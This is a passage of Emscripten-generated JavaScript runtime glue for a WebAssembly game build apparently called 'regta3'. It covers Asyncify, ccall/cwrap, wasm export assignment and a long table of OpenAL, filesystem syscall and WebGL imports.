            GLFW.active = null
        }
            ;
        var _glfwWindowHint = (target, hint) => {
            GLFW.hints[target] = hint
        }
            ;
        var _glfwWindowShouldClose = winid => {
            var win = GLFW.WindowFromId(winid);
            if (!win)
                return 0;
            return win.shouldClose
        }
            ;
        function _regta3_js_file_status(vfsPathPtr) {
            if (typeof Module !== "undefined" && typeof Module.getAsyncFileStatus === "function") {
                return Module.getAsyncFileStatus(UTF8ToString(vfsPathPtr))
            }
            return 0
        }
        function _regta3_js_is_touch() {
            if (typeof Module !== "undefined" && Module.regta3IsTouch)
                return 1;
            return 0
        }
        function _regta3_js_language_override() {
            if (typeof Module !== "undefined" && typeof Module.regta3LanguageOverride === "number") {
                return Module.regta3LanguageOverride
            }
            return -1
        }
        function _regta3_js_load_progress(current, total) {
            if (typeof Module !== "undefined" && typeof Module.reportLoadProgress === "function") {
                Module.reportLoadProgress(current, total)
            }
        }
        function _regta3_js_persist_userfiles() {
            if (typeof Module !== "undefined" && typeof Module.persistUserfiles === "function") {
                Module.persistUserfiles()
            }
        }
        function _regta3_js_prefetch_asset(vfsPathPtr) {
            if (typeof Module !== "undefined" && typeof Module.loadAsyncFile === "function") {
                try {
                    Module.loadAsyncFile(UTF8ToString(vfsPathPtr))
                } catch (e) { }
            }
        }
        function _regta3_js_touch_state(flags) {
            if (typeof Module !== "undefined" && typeof Module.setTouchState === "function") {
                Module.setTouchState(flags)
            }
        }
        var stackAlloc = sz => __emscripten_stack_alloc(sz);
        var stringToUTF8OnStack = str => {
            var size = lengthBytesUTF8(str) + 1;
            var ret = stackAlloc(size);
            stringToUTF8(str, ret, size);
            return ret
        }
            ;
        var runAndAbortIfError = func => {
            try {
                return func()
            } catch (e) {
                abort(e)
            }
        }
            ;
        var runtimeKeepalivePush = () => {
            runtimeKeepaliveCounter += 1
        }
            ;
        var runtimeKeepalivePop = () => {
            runtimeKeepaliveCounter -= 1
        }
            ;
        var Asyncify = {
            instrumentWasmImports(imports) {
                var importPattern = /^(invoke_.*|__asyncjs__.*)$/;
                for (let [x, original] of Object.entries(imports)) {
                    if (typeof original == "function") {
                        let isAsyncifyImport = original.isAsync || importPattern.test(x)
                    }
                }
            },
            instrumentFunction(original) {
                var wrapper = (...args) => {
                    Asyncify.exportCallStack.push(original);
                    try {
                        return original(...args)
                    } finally {
                        if (!ABORT) {
                            var top = Asyncify.exportCallStack.pop();
                            Asyncify.maybeStopUnwind()
                        }
                    }
                }
                    ;
                Asyncify.funcWrappers.set(original, wrapper);
                return wrapper
            },
            instrumentWasmExports(exports) {
                var ret = {};
                for (let [x, original] of Object.entries(exports)) {
                    if (typeof original == "function") {
                        var wrapper = Asyncify.instrumentFunction(original);
                        ret[x] = wrapper
                    } else {
                        ret[x] = original
                    }
                }
                return ret
            },
            State: {
                Normal: 0,
                Unwinding: 1,
                Rewinding: 2,
                Disabled: 3
            },
            state: 0,
            StackSize: 4096,
            currData: null,
            handleSleepReturnValue: 0,
            exportCallStack: [],
            callstackFuncToId: new Map,
            callStackIdToFunc: new Map,
            funcWrappers: new Map,
            callStackId: 0,
            asyncPromiseHandlers: null,
            sleepCallbacks: [],
            getCallStackId(func) {
                if (!Asyncify.callstackFuncToId.has(func)) {
                    var id = Asyncify.callStackId++;
                    Asyncify.callstackFuncToId.set(func, id);
                    Asyncify.callStackIdToFunc.set(id, func)
                }
                return Asyncify.callstackFuncToId.get(func)
            },
            maybeStopUnwind() {
                if (Asyncify.currData && Asyncify.state === Asyncify.State.Unwinding && Asyncify.exportCallStack.length === 0) {
                    Asyncify.state = Asyncify.State.Normal;
                    runAndAbortIfError(_asyncify_stop_unwind);
                    if (typeof Fibers != "undefined") {
                        Fibers.trampoline()
                    }
                }
            },
            whenDone() {
                return new Promise((resolve, reject) => {
                    Asyncify.asyncPromiseHandlers = {
                        resolve,
                        reject
                    }
                }
                )
            },
            allocateData() {
                var ptr = _malloc(12 + Asyncify.StackSize);
                Asyncify.setDataHeader(ptr, ptr + 12, Asyncify.StackSize);
                Asyncify.setDataRewindFunc(ptr);
                return ptr
            },
            setDataHeader(ptr, stack, stackSize) {
                HEAPU32[ptr >> 2] = stack;
                HEAPU32[ptr + 4 >> 2] = stack + stackSize
            },
            setDataRewindFunc(ptr) {
                var bottomOfCallStack = Asyncify.exportCallStack[0];
                var rewindId = Asyncify.getCallStackId(bottomOfCallStack);
                HEAP32[ptr + 8 >> 2] = rewindId
            },
            getDataRewindFunc(ptr) {
                var id = HEAP32[ptr + 8 >> 2];
                var func = Asyncify.callStackIdToFunc.get(id);
                return func
            },
            doRewind(ptr) {
                var original = Asyncify.getDataRewindFunc(ptr);
                var func = Asyncify.funcWrappers.get(original);
                return callUserCallback(func)
            },
            handleSleep(startAsync) {
                if (ABORT)
                    return;
                if (Asyncify.state === Asyncify.State.Normal) {
                    var reachedCallback = false;
                    var reachedAfterCallback = false;
                    startAsync((handleSleepReturnValue = 0) => {
                        if (ABORT)
                            return;
                        Asyncify.handleSleepReturnValue = handleSleepReturnValue;
                        reachedCallback = true;
                        if (!reachedAfterCallback) {
                            return
                        }
                        Asyncify.state = Asyncify.State.Rewinding;
                        runAndAbortIfError(() => _asyncify_start_rewind(Asyncify.currData));
                        if (typeof MainLoop != "undefined" && MainLoop.func) {
                            MainLoop.resume()
                        }
                        var asyncWasmReturnValue, isError = false;
                        try {
                            asyncWasmReturnValue = Asyncify.doRewind(Asyncify.currData)
                        } catch (err) {
                            asyncWasmReturnValue = err;
                            isError = true
                        }
                        var handled = false;
                        if (!Asyncify.currData) {
                            var asyncPromiseHandlers = Asyncify.asyncPromiseHandlers;
                            if (asyncPromiseHandlers) {
                                Asyncify.asyncPromiseHandlers = null;
                                (isError ? asyncPromiseHandlers.reject : asyncPromiseHandlers.resolve)(asyncWasmReturnValue);
                                handled = true
                            }
                        }
                        if (isError && !handled) {
                            throw asyncWasmReturnValue
                        }
                    }
                    );
                    reachedAfterCallback = true;
                    if (!reachedCallback) {
                        Asyncify.state = Asyncify.State.Unwinding;
                        Asyncify.currData = Asyncify.allocateData();
                        if (typeof MainLoop != "undefined" && MainLoop.func) {
                            MainLoop.pause()
                        }
                        runAndAbortIfError(() => _asyncify_start_unwind(Asyncify.currData))
                    }
                } else if (Asyncify.state === Asyncify.State.Rewinding) {
                    Asyncify.state = Asyncify.State.Normal;
                    runAndAbortIfError(_asyncify_stop_rewind);
                    _free(Asyncify.currData);
                    Asyncify.currData = null;
                    Asyncify.sleepCallbacks.forEach(callUserCallback)
                } else {
                    abort(`invalid state: ${Asyncify.state}`)
                }
                return Asyncify.handleSleepReturnValue
            },
            handleAsync: startAsync => Asyncify.handleSleep(async wakeUp => {
                wakeUp(await startAsync())
            }
            )
        };
        var getCFunc = ident => {
            var func = Module["_" + ident];
            return func
        }
            ;
        var writeArrayToMemory = (array, buffer) => {
            HEAP8.set(array, buffer)
        }
            ;
        var ccall = (ident, returnType, argTypes, args, opts) => {
            var toC = {
                string: str => {
                    var ret = 0;
                    if (str !== null && str !== undefined && str !== 0) {
                        ret = stringToUTF8OnStack(str)
                    }
                    return ret
                }
                ,
                array: arr => {
                    var ret = stackAlloc(arr.length);
                    writeArrayToMemory(arr, ret);
                    return ret
                }
            };
            function convertReturnValue(ret) {
                if (returnType === "string") {
                    return UTF8ToString(ret)
                }
                if (returnType === "boolean")
                    return Boolean(ret);
                return ret
            }
            var func = getCFunc(ident);
            var cArgs = [];
            var stack = 0;
            if (args) {
                for (var i = 0; i < args.length; i++) {
                    var converter = toC[argTypes[i]];
                    if (converter) {
                        if (stack === 0)
                            stack = stackSave();
                        cArgs[i] = converter(args[i])
                    } else {
                        cArgs[i] = args[i]
                    }
                }
            }
            var previousAsync = Asyncify.currData;
            var ret = func(...cArgs);
            function onDone(ret) {
                runtimeKeepalivePop();
                if (stack !== 0)
                    stackRestore(stack);
                return convertReturnValue(ret)
            }
            var asyncMode = opts?.async;
            runtimeKeepalivePush();
            if (Asyncify.currData != previousAsync) {
                return Asyncify.whenDone().then(onDone)
            }
            ret = onDone(ret);
            if (asyncMode)
                return Promise.resolve(ret);
            return ret
        }
            ;
        var cwrap = (ident, returnType, argTypes, opts) => {
            var numericArgs = !argTypes || argTypes.every(type => type === "number" || type === "boolean");
            var numericRet = returnType !== "string";
            if (numericRet && numericArgs && !opts) {
                return getCFunc(ident)
            }
            return (...args) => ccall(ident, returnType, argTypes, args, opts)
        }
            ;
        var FS_createPath = (...args) => FS.createPath(...args);
        var FS_unlink = (...args) => FS.unlink(...args);
        var FS_createLazyFile = (...args) => FS.createLazyFile(...args);
        var FS_createDevice = (...args) => FS.createDevice(...args);
        FS.createPreloadedFile = FS_createPreloadedFile;
        FS.preloadFile = FS_preloadFile;
        FS.staticInit();
        Module["requestAnimationFrame"] = MainLoop.requestAnimationFrame;
        Module["pauseMainLoop"] = MainLoop.pause;
        Module["resumeMainLoop"] = MainLoop.resume;
        MainLoop.init();
        for (let i = 0; i < 32; ++i)
            tempFixedLengthArray.push(new Array(i));
        var miniTempWebGLFloatBuffersStorage = new Float32Array(288);
        for (var i = 0; i <= 288; ++i) {
            miniTempWebGLFloatBuffers[i] = miniTempWebGLFloatBuffersStorage.subarray(0, i)
        }
        var miniTempWebGLIntBuffersStorage = new Int32Array(288);
        for (var i = 0; i <= 288; ++i) {
            miniTempWebGLIntBuffers[i] = miniTempWebGLIntBuffersStorage.subarray(0, i)
        }
        {
            if (Module["preloadPlugins"])
                preloadPlugins = Module["preloadPlugins"];
            if (Module["noExitRuntime"])
                noExitRuntime = Module["noExitRuntime"];
            if (Module["print"])
                out = Module["print"];
            if (Module["printErr"])
                err = Module["printErr"];
            if (Module["wasmBinary"])
                wasmBinary = Module["wasmBinary"];
            if (Module["arguments"])
                arguments_ = Module["arguments"];
            if (Module["thisProgram"])
                thisProgram = Module["thisProgram"];
            if (Module["preInit"]) {
                if (typeof Module["preInit"] == "function")
                    Module["preInit"] = [Module["preInit"]];
                while (Module["preInit"].length > 0) {
                    Module["preInit"].shift()()
                }
            }
        }
        Module["callMain"] = callMain;
        Module["noExitRuntime"] = noExitRuntime;
        Module["addRunDependency"] = addRunDependency;
        Module["removeRunDependency"] = removeRunDependency;
        Module["ccall"] = ccall;
        Module["cwrap"] = cwrap;
        Module["FS_preloadFile"] = FS_preloadFile;
        Module["FS_unlink"] = FS_unlink;
        Module["FS_createPath"] = FS_createPath;
        Module["FS_createDevice"] = FS_createDevice;
        Module["FS"] = FS;
        Module["FS_createDataFile"] = FS_createDataFile;
        Module["FS_createLazyFile"] = FS_createLazyFile;
        Module["OPFS"] = OPFS;
        var ASM_CONSTS = {
            209920: () => {
                try {
                    if (typeof globalThis !== "undefined" && typeof globalThis.__regta3ResumeOpenAl === "function")
                        globalThis.__regta3ResumeOpenAl();
                    if (typeof Module !== "undefined" && typeof Module.resumeRegta3Audio === "function")
                        Module.resumeRegta3Audio()
                } catch (e) { }
            }
            ,
            210189: () => {
                try {
                    if (typeof globalThis !== "undefined" && typeof globalThis.__regta3ResumeOpenAl === "function")
                        globalThis.__regta3ResumeOpenAl()
                } catch (e) { }
            }
            ,
            210345: () => {
                try {
                    if (typeof globalThis !== "undefined" && typeof globalThis.__regta3ResumeOpenAl === "function")
                        globalThis.__regta3ResumeOpenAl();
                    if (typeof Module !== "undefined" && typeof Module.resumeRegta3Audio === "function")
                        Module.resumeRegta3Audio()
                } catch (e) { }
            }
            ,
            210614: () => {
                try {
                    if (typeof prefetchFirstMissionAudio === "function")
                        prefetchFirstMissionAudio();
                    else if (typeof Module !== "undefined" && typeof Module.prefetchFirstMissionAudio === "function")
                        Module.prefetchFirstMissionAudio()
                } catch (e) { }
            }
        };
        var _free, _malloc, _regta3_on_audio_resumed, _main, _async_main, _sbrk, __emscripten_stack_restore, __emscripten_stack_alloc, _emscripten_stack_get_current, dynCall_iii, dynCall_ii, dynCall_vi, dynCall_iiii, dynCall_iiiii, dynCall_vii, dynCall_vff, dynCall_v, dynCall_iiiiii, dynCall_viii, dynCall_viiiii, dynCall_vidd, dynCall_viiif, dynCall_fi, dynCall_iiiiiii, dynCall_viiii, dynCall_viiifi, dynCall_fii, dynCall_jiji, dynCall_jij, dynCall_iij, dynCall_ji, dynCall_vffff, dynCall_vf, dynCall_viiiiiiii, dynCall_viiiiiiiii, dynCall_i, dynCall_viiiiiii, dynCall_vfi, dynCall_viif, dynCall_vif, dynCall_viff, dynCall_vifff, dynCall_viffff, dynCall_viiiiii, dynCall_vfff, dynCall_viiiiiiiiii, dynCall_viiiiiiiiiii, dynCall_viifi, dynCall_iiij, dynCall_viij, dynCall_iidiiii, dynCall_viijii, dynCall_iiiiiiiii, dynCall_iiiiij, dynCall_iiiiid, dynCall_iiiiijj, dynCall_iiiiiiii, dynCall_iiiiiijj, _asyncify_start_unwind, _asyncify_stop_unwind, _asyncify_start_rewind, _asyncify_stop_rewind, memory, __indirect_function_table, wasmMemory;
        function assignWasmExports(wasmExports) {
            _free = Module["_free"] = wasmExports["mg"];
            _malloc = Module["_malloc"] = wasmExports["ng"];
            _regta3_on_audio_resumed = Module["_regta3_on_audio_resumed"] = wasmExports["og"];
            _main = Module["_main"] = wasmExports["pg"];
            _async_main = Module["_async_main"] = wasmExports["qg"];
            _sbrk = Module["_sbrk"] = wasmExports["rg"];
            __emscripten_stack_restore = wasmExports["sg"];
            __emscripten_stack_alloc = wasmExports["tg"];
            _emscripten_stack_get_current = wasmExports["ug"];
            dynCall_iii = dynCalls["iii"] = wasmExports["vg"];
            dynCall_ii = dynCalls["ii"] = wasmExports["wg"];
            dynCall_vi = dynCalls["vi"] = wasmExports["xg"];
            dynCall_iiii = dynCalls["iiii"] = wasmExports["yg"];
            dynCall_iiiii = dynCalls["iiiii"] = wasmExports["zg"];
            dynCall_vii = dynCalls["vii"] = wasmExports["Ag"];
            dynCall_vff = dynCalls["vff"] = wasmExports["Bg"];
            dynCall_v = dynCalls["v"] = wasmExports["Cg"];
            dynCall_iiiiii = dynCalls["iiiiii"] = wasmExports["Dg"];
            dynCall_viii = dynCalls["viii"] = wasmExports["Eg"];
            dynCall_viiiii = dynCalls["viiiii"] = wasmExports["Fg"];
            dynCall_vidd = dynCalls["vidd"] = wasmExports["Gg"];
            dynCall_viiif = dynCalls["viiif"] = wasmExports["Hg"];
            dynCall_fi = dynCalls["fi"] = wasmExports["Ig"];
            dynCall_iiiiiii = dynCalls["iiiiiii"] = wasmExports["Jg"];
            dynCall_viiii = dynCalls["viiii"] = wasmExports["Kg"];
            dynCall_viiifi = dynCalls["viiifi"] = wasmExports["Lg"];
            dynCall_fii = dynCalls["fii"] = wasmExports["Mg"];
            dynCall_jiji = dynCalls["jiji"] = wasmExports["Ng"];
            dynCall_jij = dynCalls["jij"] = wasmExports["Og"];
            dynCall_iij = dynCalls["iij"] = wasmExports["Pg"];
            dynCall_ji = dynCalls["ji"] = wasmExports["Qg"];
            dynCall_vffff = dynCalls["vffff"] = wasmExports["Rg"];
            dynCall_vf = dynCalls["vf"] = wasmExports["Sg"];
            dynCall_viiiiiiii = dynCalls["viiiiiiii"] = wasmExports["Tg"];
            dynCall_viiiiiiiii = dynCalls["viiiiiiiii"] = wasmExports["Ug"];
            dynCall_i = dynCalls["i"] = wasmExports["Vg"];
            dynCall_viiiiiii = dynCalls["viiiiiii"] = wasmExports["Wg"];
            dynCall_vfi = dynCalls["vfi"] = wasmExports["Xg"];
            dynCall_viif = dynCalls["viif"] = wasmExports["Yg"];
            dynCall_vif = dynCalls["vif"] = wasmExports["Zg"];
            dynCall_viff = dynCalls["viff"] = wasmExports["_g"];
            dynCall_vifff = dynCalls["vifff"] = wasmExports["$g"];
            dynCall_viffff = dynCalls["viffff"] = wasmExports["ah"];
            dynCall_viiiiii = dynCalls["viiiiii"] = wasmExports["bh"];
            dynCall_vfff = dynCalls["vfff"] = wasmExports["ch"];
            dynCall_viiiiiiiiii = dynCalls["viiiiiiiiii"] = wasmExports["dh"];
            dynCall_viiiiiiiiiii = dynCalls["viiiiiiiiiii"] = wasmExports["eh"];
            dynCall_viifi = dynCalls["viifi"] = wasmExports["fh"];
            dynCall_iiij = dynCalls["iiij"] = wasmExports["gh"];
            dynCall_viij = dynCalls["viij"] = wasmExports["hh"];
            dynCall_iidiiii = dynCalls["iidiiii"] = wasmExports["ih"];
            dynCall_viijii = dynCalls["viijii"] = wasmExports["jh"];
            dynCall_iiiiiiiii = dynCalls["iiiiiiiii"] = wasmExports["kh"];
            dynCall_iiiiij = dynCalls["iiiiij"] = wasmExports["lh"];
            dynCall_iiiiid = dynCalls["iiiiid"] = wasmExports["mh"];
            dynCall_iiiiijj = dynCalls["iiiiijj"] = wasmExports["nh"];
            dynCall_iiiiiiii = dynCalls["iiiiiiii"] = wasmExports["oh"];
            dynCall_iiiiiijj = dynCalls["iiiiiijj"] = wasmExports["ph"];
            _asyncify_start_unwind = wasmExports["qh"];
            _asyncify_stop_unwind = wasmExports["rh"];
            _asyncify_start_rewind = wasmExports["sh"];
            _asyncify_stop_rewind = wasmExports["th"];
            memory = wasmMemory = wasmExports["kg"];
            __indirect_function_table = wasmExports["__indirect_function_table"]
        }
        var wasmImports = {
            v: ___cxa_throw,
            kb: ___syscall_chdir,
            lb: ___syscall_faccessat,
            d: ___syscall_fcntl64,
            ib: ___syscall_fstat64,
            eb: ___syscall_getcwd,
            Ya: ___syscall_getdents64,
            nb: ___syscall_ioctl,
            fb: ___syscall_lstat64,
            ab: ___syscall_mkdirat,
            gb: ___syscall_newfstatat,
            M: ___syscall_openat,
            Va: ___syscall_poll,
            Xa: ___syscall_readlinkat,
            Wa: ___syscall_renameat,
            hb: ___syscall_stat64,
            Ua: ___syscall_statfs64,
            Ta: ___syscall_unlinkat,
            Ra: __abort_js,
            Za: __gmtime_js,
            _a: __localtime_js,
            $a: __tzset_js,
            p: _alBufferData,
            qe: _alBufferiv,
            V: _alDeleteBuffers,
            q: _alDeleteSources,
            wb: _alDistanceModel,
            W: _alGenBuffers,
            z: _alGenSources,
            wc: _alGetEnumValue,
            r: _alGetError,
            $c: _alGetSourcef,
            a: _alGetSourcei,
            lc: _alGetString,
            T: _alIsBuffer,
            f: _alIsExtensionPresent,
            P: _alListener3f,
            ac: _alListenerf,
            Hb: _alListenerfv,
            j: _alSource3f,
            y: _alSource3i,
            S: _alSourcePause,
            w: _alSourcePlay,
            o: _alSourceQueueBuffers,
            x: _alSourceStop,
            n: _alSourceUnqueueBuffers,
            b: _alSourcef,
            g: _alSourcei,
            D: _alcCloseDevice,
            Q: _alcCreateContext,
            F: _alcDestroyContext,
            H: _alcGetIntegerv,
            A: _alcGetString,
            B: _alcIsExtensionPresent,
            l: _alcMakeContextCurrent,
            U: _alcOpenDevice,
            mb: _alcSuspendContext,
            m: _emscripten_asm_const_int,
            va: _emscripten_cancel_main_loop,
            jb: _emscripten_date_now,
            za: _emscripten_exit_with_live_runtime,
            Na: _emscripten_get_element_css_size,
            Ka: _emscripten_get_gamepad_status,
            c: _emscripten_get_now,
            La: _emscripten_get_num_gamepads,
            gg: _emscripten_glActiveTexture,
            fg: _emscripten_glAttachShader,
            hd: _emscripten_glBeginQuery,
            ha: _emscripten_glBeginQueryEXT,
            Pc: _emscripten_glBeginTransformFeedback,
            eg: _emscripten_glBindAttribLocation,
            dg: _emscripten_glBindBuffer,
            Mc: _emscripten_glBindBufferBase,
            Nc: _emscripten_glBindBufferRange,
            cg: _emscripten_glBindFramebuffer,
            bg: _emscripten_glBindRenderbuffer,
            Rb: _emscripten_glBindSampler,
            ag: _emscripten_glBindTexture,
            Jb: _emscripten_glBindTransformFeedback,
            Uc: _emscripten_glBindVertexArray,
            $: _emscripten_glBindVertexArrayOES,
            $f: _emscripten_glBlendColor,
            _f: _emscripten_glBlendEquation,
            Zf: _emscripten_glBlendEquationSeparate,
            Yf: _emscripten_glBlendFunc,
            Xf: _emscripten_glBlendFuncSeparate,
            Xc: _emscripten_glBlitFramebuffer,
            Wf: _emscripten_glBufferData,
            Vf: _emscripten_glBufferSubData,
            Uf: _emscripten_glCheckFramebufferStatus,
            Tf: _emscripten_glClear,
            oc: _emscripten_glClearBufferfi,
            pc: _emscripten_glClearBufferfv,
            rc: _emscripten_glClearBufferiv,
            qc: _emscripten_glClearBufferuiv,
            Sf: _emscripten_glClearColor,
            Rf: _emscripten_glClearDepthf,
            Qf: _emscripten_glClearStencil,
            _b: _emscripten_glClientWaitSync,
            xd: _emscripten_glClipControlEXT,
            Pf: _emscripten_glColorMask,
            Of: _emscripten_glCompileShader,
            Nf: _emscripten_glCompressedTexImage2D,
            md: _emscripten_glCompressedTexImage3D,
            Mf: _emscripten_glCompressedTexSubImage2D,
            ld: _emscripten_glCompressedTexSubImage3D,
            mc: _emscripten_glCopyBufferSubData,
            Lf: _emscripten_glCopyTexImage2D,
            Kf: _emscripten_glCopyTexSubImage2D,
            nd: _emscripten_glCopyTexSubImage3D,
            Jf: _emscripten_glCreateProgram,
            If: _emscripten_glCreateShader,
            Hf: _emscripten_glCullFace,
            Gf: _emscripten_glDeleteBuffers,
            Ff: _emscripten_glDeleteFramebuffers,
            Ef: _emscripten_glDeleteProgram,
            jd: _emscripten_glDeleteQueries,
            ja: _emscripten_glDeleteQueriesEXT,
            Df: _emscripten_glDeleteRenderbuffers,
            Tb: _emscripten_glDeleteSamplers,
            Cf: _emscripten_glDeleteShader,
            $b: _emscripten_glDeleteSync,
            Bf: _emscripten_glDeleteTextures,
            Ib: _emscripten_glDeleteTransformFeedbacks,
            Tc: _emscripten_glDeleteVertexArrays,
            _: _emscripten_glDeleteVertexArraysOES,
            Af: _emscripten_glDepthFunc,
            zf: _emscripten_glDepthMask,
            yf: _emscripten_glDepthRangef,
            xf: _emscripten_glDetachShader,
            wf: _emscripten_glDisable,
            vf: _emscripten_glDisableVertexAttribArray,
            uf: _emscripten_glDrawArrays,
            ec: _emscripten_glDrawArraysInstanced,
            jg: _emscripten_glDrawArraysInstancedANGLE,
            qb: _emscripten_glDrawArraysInstancedARB,
            ud: _emscripten_glDrawArraysInstancedEXT,
            rb: _emscripten_glDrawArraysInstancedNV,
            dd: _emscripten_glDrawBuffers,
            sd: _emscripten_glDrawBuffersEXT,
            X: _emscripten_glDrawBuffersWEBGL,
            tf: _emscripten_glDrawElements,
            dc: _emscripten_glDrawElementsInstanced,
            ig: _emscripten_glDrawElementsInstancedANGLE,
            ob: _emscripten_glDrawElementsInstancedARB,
            pb: _emscripten_glDrawElementsInstancedEXT,
            td: _emscripten_glDrawElementsInstancedNV,
            qd: _emscripten_glDrawRangeElements,
            sf: _emscripten_glEnable,
            rf: _emscripten_glEnableVertexAttribArray,
            gd: _emscripten_glEndQuery,
            ga: _emscripten_glEndQueryEXT,
            Oc: _emscripten_glEndTransformFeedback,
            cc: _emscripten_glFenceSync,
            qf: _emscripten_glFinish,
            pf: _emscripten_glFlush,
            of: _emscripten_glFramebufferRenderbuffer,
            nf: _emscripten_glFramebufferTexture2D,
            Vc: _emscripten_glFramebufferTextureLayer,
            mf: _emscripten_glFrontFace,
            lf: _emscripten_glGenBuffers,
            jf: _emscripten_glGenFramebuffers,
            kd: _emscripten_glGenQueries,
            ka: _emscripten_glGenQueriesEXT,
            hf: _emscripten_glGenRenderbuffers,
            Ub: _emscripten_glGenSamplers,
            gf: _emscripten_glGenTextures,
            Gb: _emscripten_glGenTransformFeedbacks,
            Sc: _emscripten_glGenVertexArrays,
            Z: _emscripten_glGenVertexArraysOES,
            kf: _emscripten_glGenerateMipmap,
            ff: _emscripten_glGetActiveAttrib,
            ef: _emscripten_glGetActiveUniform,
            gc: _emscripten_glGetActiveUniformBlockName,
            hc: _emscripten_glGetActiveUniformBlockiv,
            jc: _emscripten_glGetActiveUniformsiv,
            df: _emscripten_glGetAttachedShaders,
            cf: _emscripten_glGetAttribLocation,
            bf: _emscripten_glGetBooleanv,
            Vb: _emscripten_glGetBufferParameteri64v,
            af: _emscripten_glGetBufferParameteriv,
            $e: _emscripten_glGetError,
            _e: _emscripten_glGetFloatv,
            Bc: _emscripten_glGetFragDataLocation,
            Ze: _emscripten_glGetFramebufferAttachmentParameteriv,
            Wb: _emscripten_glGetInteger64i_v,
            Yb: _emscripten_glGetInteger64v,
            Qc: _emscripten_glGetIntegeri_v,
            Ye: _emscripten_glGetIntegerv,
            ub: _emscripten_glGetInternalformativ,
            Cb: _emscripten_glGetProgramBinary,
            We: _emscripten_glGetProgramInfoLog,
            Xe: _emscripten_glGetProgramiv,
            ba: _emscripten_glGetQueryObjecti64vEXT,
            da: _emscripten_glGetQueryObjectivEXT,
            aa: _emscripten_glGetQueryObjectui64vEXT,
            ed: _emscripten_glGetQueryObjectuiv,
            ca: _emscripten_glGetQueryObjectuivEXT,
            fd: _emscripten_glGetQueryiv,
            ea: _emscripten_glGetQueryivEXT,
            Ve: _emscripten_glGetRenderbufferParameteriv,
            Lb: _emscripten_glGetSamplerParameterfv,
            Mb: _emscripten_glGetSamplerParameteriv,
            Te: _emscripten_glGetShaderInfoLog,
            Se: _emscripten_glGetShaderPrecisionFormat,
            Re: _emscripten_glGetShaderSource,
            Ue: _emscripten_glGetShaderiv,
            Qe: _emscripten_glGetString,
            nc: _emscripten_glGetStringi,
            Xb: _emscripten_glGetSynciv,
            Pe: _emscripten_glGetTexParameterfv,
            Oe: _emscripten_glGetTexParameteriv,
            Kc: _emscripten_glGetTransformFeedbackVarying,
            ic: _emscripten_glGetUniformBlockIndex,
            kc: _emscripten_glGetUniformIndices,
            Le: _emscripten_glGetUniformLocation,
            Ne: _emscripten_glGetUniformfv,
            Me: _emscripten_glGetUniformiv,
            Cc: _emscripten_glGetUniformuiv,
            Ic: _emscripten_glGetVertexAttribIiv,
            Hc: _emscripten_glGetVertexAttribIuiv,
            Ie: _emscripten_glGetVertexAttribPointerv,
            Ke: _emscripten_glGetVertexAttribfv,
            Je: _emscripten_glGetVertexAttribiv,
            He: _emscripten_glHint,
            zb: _emscripten_glInvalidateFramebuffer,
            yb: _emscripten_glInvalidateSubFramebuffer,
            Ge: _emscripten_glIsBuffer,
            Fe: _emscripten_glIsEnabled,
            Ee: _emscripten_glIsFramebuffer,
            De: _emscripten_glIsProgram,
            id: _emscripten_glIsQuery,
            ia: _emscripten_glIsQueryEXT,
            Ce: _emscripten_glIsRenderbuffer,
            Sb: _emscripten_glIsSampler,
            Be: _emscripten_glIsShader,
            bc: _emscripten_glIsSync,
            Ae: _emscripten_glIsTexture,
            Fb: _emscripten_glIsTransformFeedback,
            Rc: _emscripten_glIsVertexArray,
            Y: _emscripten_glIsVertexArrayOES,
            ze: _emscripten_glLineWidth,
            ye: _emscripten_glLinkProgram,
            Eb: _emscripten_glPauseTransformFeedback,
            xe: _emscripten_glPixelStorei,
            wd: _emscripten_glPolygonModeWEBGL,
            we: _emscripten_glPolygonOffset,
            yd: _emscripten_glPolygonOffsetClampEXT,
            Bb: _emscripten_glProgramBinary,
            Ab: _emscripten_glProgramParameteri,
            fa: _emscripten_glQueryCounterEXT,
            rd: _emscripten_glReadBuffer,
            ve: _emscripten_glReadPixels,
            ue: _emscripten_glReleaseShaderCompiler,
            te: _emscripten_glRenderbufferStorage,
            Wc: _emscripten_glRenderbufferStorageMultisample,
            Db: _emscripten_glResumeTransformFeedback,
            se: _emscripten_glSampleCoverage,
            Ob: _emscripten_glSamplerParameterf,
            Nb: _emscripten_glSamplerParameterfv,
            Qb: _emscripten_glSamplerParameteri,
            Pb: _emscripten_glSamplerParameteriv,
            re: _emscripten_glScissor,
            pe: _emscripten_glShaderBinary,
            oe: _emscripten_glShaderSource,
            ne: _emscripten_glStencilFunc,
            me: _emscripten_glStencilFuncSeparate,
            le: _emscripten_glStencilMask,
            ke: _emscripten_glStencilMaskSeparate,
            je: _emscripten_glStencilOp,
            ie: _emscripten_glStencilOpSeparate,
            he: _emscripten_glTexImage2D,
            pd: _emscripten_glTexImage3D,
            ge: _emscripten_glTexParameterf,
            fe: _emscripten_glTexParameterfv,
            ee: _emscripten_glTexParameteri,
            de: _emscripten_glTexParameteriv,
            xb: _emscripten_glTexStorage2D,
            vb: _emscripten_glTexStorage3D,
            ce: _emscripten_glTexSubImage2D,
            od: _emscripten_glTexSubImage3D,
            Lc: _emscripten_glTransformFeedbackVaryings,
            be: _emscripten_glUniform1f,
            ae: _emscripten_glUniform1fv,
            $d: _emscripten_glUniform1i,
            _d: _emscripten_glUniform1iv,
            Ac: _emscripten_glUniform1ui,
            vc: _emscripten_glUniform1uiv,
            Zd: _emscripten_glUniform2f,
            Yd: _emscripten_glUniform2fv,
            Xd: _emscripten_glUniform2i,
            Wd: _emscripten_glUniform2iv,
            zc: _emscripten_glUniform2ui,
            uc: _emscripten_glUniform2uiv,
            Vd: _emscripten_glUniform3f,
            Ud: _emscripten_glUniform3fv,
            Td: _emscripten_glUniform3i,
            Sd: _emscripten_glUniform3iv,
            yc: _emscripten_glUniform3ui,
            tc: _emscripten_glUniform3uiv,
            Rd: _emscripten_glUniform4f,
            Qd: _emscripten_glUniform4fv,
            Pd: _emscripten_glUniform4i,
            Od: _emscripten_glUniform4iv,
            xc: _emscripten_glUniform4ui,
            sc: _emscripten_glUniform4uiv,
            fc: _emscripten_glUniformBlockBinding,
            Nd: _emscripten_glUniformMatrix2fv,
            cd: _emscripten_glUniformMatrix2x3fv,
            ad: _emscripten_glUniformMatrix2x4fv,
            Md: _emscripten_glUniformMatrix3fv,
            bd: _emscripten_glUniformMatrix3x2fv,
            Zc: _emscripten_glUniformMatrix3x4fv,
            Ld: _emscripten_glUniformMatrix4fv,
            _c: _emscripten_glUniformMatrix4x2fv,
            Yc: _emscripten_glUniformMatrix4x3fv,
            Kd: _emscripten_glUseProgram,
            Jd: _emscripten_glValidateProgram,
